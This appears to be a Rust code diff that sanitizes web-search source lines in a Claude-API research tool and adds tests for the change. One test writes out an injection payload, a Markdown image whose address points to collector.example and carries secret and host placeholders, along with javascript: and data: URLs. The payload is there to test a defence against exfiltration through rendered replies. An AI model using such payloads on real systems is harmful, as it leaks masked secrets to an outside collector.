@@ -434,8 +434,7 @@ async fn research(
                     for result in results.into_iter().flatten() {
                         let url = result.get("url").and_then(Value::as_str);
                         let title = result.get("title").and_then(Value::as_str);
-                        if let Some(url) = url {
-                            let line = format!("- {}: {url}", title.unwrap_or("source"));
+                        if let Some(line) = source_line(title, url) {
                             if !sources.contains(&line) {
                                 sources.push(line);
                             }
@@ -459,12 +458,50 @@ async fn research(
         text.push_str("\n\nSources consulted:\n");
         text.push_str(&sources[..sources.len().min(12)].join("\n"));
     }
-    text.truncate(MAX_REPLY);
+    // On a character boundary: `String::truncate` panics inside one.
+    if text.len() > MAX_REPLY {
+        let mut end = MAX_REPLY;
+        while !text.is_char_boundary(end) {
+            end -= 1;
+        }
+        text.truncate(end);
+    }
     Ok(Attempt {
         text,
         counts,
         declined: None,
     })
+}
+
+/// One line of the list of pages a search read. The title is whatever the
+/// page calls itself, the address whatever the search returned: neither may
+/// bring Markdown, a placeholder or anything but a web address into the
+/// reply, which meow then unmasks and saves.
+fn source_line(title: Option<&str>, url: Option<&str>) -> Option<String> {
+    let plain = |text: &str, max: usize| -> String {
+        crate::evidence::sanitize(text, max)
+            .chars()
+            .filter(|c| {
+                !matches!(
+                    c,
+                    '<' | '>' | '[' | ']' | '(' | ')' | '!' | '`' | '|' | '\\'
+                )
+            })
+            .collect::<String>()
+            .trim()
+            .to_owned()
+    };
+    let url = url?.trim();
+    let parsed = url::Url::parse(url).ok()?;
+    if !matches!(parsed.scheme(), "http" | "https") || url.contains(['<', '>', '`', ' ']) {
+        return None;
+    }
+    let url = crate::evidence::sanitize(url, 500);
+    let title = title.map(|t| plain(t, 200)).filter(|t| !t.is_empty());
+    Some(format!(
+        "- {}: `{url}`",
+        title.as_deref().unwrap_or("source")
+    ))
 }
 
 /// What came back from the Claude API for one question.
@@ -908,6 +945,34 @@ mod tests {
         assert_eq!(mock.requests.lock().unwrap().len(), 1);
     }
 
+    #[test]
+    fn a_search_result_brings_no_markdown_placeholder_or_odd_address_into_the_reply() {
+        let line = source_line(
+            Some("![s](https://collector.example/p.png?a=<<SEC_01>>&h=<<HOST_01>>) `x` | y"),
+            Some("https://example.org/advisory"),
+        )
+        .unwrap();
+        assert!(line.ends_with(": `https://example.org/advisory`"), "{line}");
+        for mark in ["![", "](", "<<", ">>", "|"] {
+            assert!(!line.contains(mark), "{mark} in {line}");
+        }
+        assert_eq!(line.matches('`').count(), 2, "{line}");
+        assert_eq!(
+            source_line(None, Some("https://example.org/a")).unwrap(),
+            "- source: `https://example.org/a`"
+        );
+        for bad in [
+            "javascript:alert(1)",
+            "data:text/html,x",
+            "https://collector.example/?a=<<SEC_01>>",
+            "https://collector.example/a`b",
+            "not a url",
+        ] {
+            assert_eq!(source_line(Some("t"), Some(bad)), None, "{bad}");
+        }
+        assert_eq!(source_line(Some("t"), None), None);
+    }
+
     #[tokio::test]
     async fn research_searches_on_claudes_side_and_resumes_a_paused_turn() {
         let (base, mock) = claude_api().await;
@@ -916,8 +981,8 @@ mod tests {
         assert_eq!(
             answer.text,
             "Looking it up. Fixed in 1.20.1.\n\nSources consulted:\n\
-             - nginx security advisories: https://nginx.org/en/security_advisories.html\n\
-             - NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-23017"
+             - nginx security advisories: `https://nginx.org/en/security_advisories.html`\n\
+             - NVD: `https://nvd.nist.gov/vuln/detail/CVE-2021-23017`"
         );
         assert_eq!(shown, answer.text, "shown once, complete");
         assert_eq!(answer.usage.web_search_requests, 2);
